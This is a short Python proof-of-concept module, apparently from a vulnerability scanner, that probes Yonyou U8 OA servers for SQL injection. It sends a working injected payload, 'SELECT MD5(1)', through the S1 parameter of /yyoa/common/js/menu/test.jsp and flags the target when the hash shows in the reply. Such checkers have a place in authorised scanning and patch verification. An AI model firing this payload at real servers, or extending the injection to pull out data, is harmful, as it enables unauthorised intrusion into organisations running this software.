from poc import core

def check_sqli(url):
    name = '用友 U8 OA test.jsp SQL注入漏洞'
    core.start_echo(name)
    path = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
    r = core.get(url, path)
    if r:
        if "c4ca4238a0b" in r.text:
            core.end_echo(name, 'Payload：' + url + path)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)